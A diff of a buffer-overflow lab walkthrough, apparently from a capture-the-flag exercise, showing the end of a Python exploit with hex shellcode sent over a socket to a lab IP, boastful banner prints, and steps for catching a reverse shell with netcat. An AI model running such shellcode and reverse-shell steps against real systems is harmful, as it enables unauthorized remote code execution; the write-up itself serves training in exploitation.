@@ -1013,7 +1013,13 @@ b"\x28\x05\x41\xf9\xaa\xaf\x3a\xfe\xb3\xda\x3f\xba\x73\x37\x32"
 b"\xd3\x11\x37\xe1\xd4\x33")
 
 try:        
-        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
+        print("X:\>Fz3r0.buffer_overflow> Hack the World, take no prisoners")
+        print("")
+        print("                           I'm Fz3r0 and the Sun no longer rises")
+        print("")
+        print("X:\>Fz3r0.buffer_overflow>         Github :   Fz3r0")
+        print("X:\>Fz3r0.buffer_overflow>         Twitter:   Fz3r0_OPs")
+        print("") 
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(('10.10.246.155',9999))      
         s.recv(1024)
@@ -1025,14 +1031,25 @@ try:
         s.close()
         
 except:
-        print("X:\>Fz3r0.buffer_overflow> I went to hell and now I'm back with a treasure")
+        print("X:\>Fz3r0.buffer_overflow> Exploit done! Root gained! The final victory!!!")       
         sys.exit()
 ```
 
 - `chmod +x` to make it executable:
 
-    -  
+    - ![image](https://user-images.githubusercontent.com/94720207/169632909-311dfb2f-e051-4dcd-ab6f-2518bd0909b5.png)
 
+- We don't need to run anymore the chat or the immunity debugger...obviously hehe...
+
+- We are attacking the real Chat Server with the IP and Port of that remote server, so...we only need to run the script and a `netcat` to catch the shell:
+
+    - Netcat:
+    
+        - ![image](https://user-images.githubusercontent.com/94720207/169632960-cd485194-a16c-4943-aa2a-822b5c97324c.png)
+
+    - Execute the final script!!! Kill it!!!
+
+        - 
 
 ```
 ```
